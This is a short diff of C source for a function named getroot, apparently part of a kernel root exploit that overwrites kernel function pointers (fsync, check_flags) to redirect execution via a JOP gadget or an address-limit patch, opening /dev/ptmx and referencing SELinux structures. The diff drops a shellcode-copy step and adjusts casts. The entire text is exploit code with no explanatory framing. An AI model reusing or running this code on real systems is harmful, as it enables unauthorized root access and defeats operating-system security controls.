@@ -300,12 +300,11 @@ int getroot(struct offsets* o)
 	struct thread_info* ti;
 
 	printf("[+] Installing func ptr\n");
-	if(write_at_address(o->fsync, (long)MMAP_START))
+	if(write_at_address(o->fsync, (unsigned long)&patchaddrlimit))
 		return 1;
 
 	sidtab = o->sidtab;
 	policydb = o->policydb;
-	copyshellcode(MMAP_START);
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		return 1;
 	
@@ -336,7 +335,7 @@ int getroot(struct offsets* o)
 	struct thread_info* ti;
 
 	printf("[+] Installing JOP\n");
-	if(write_at_address(o->check_flags, (long)o->joploc))
+	if(write_at_address(o->check_flags, (unsigned long)o->joploc))
 		return 1;
 
 	sidtab = o->sidtab;
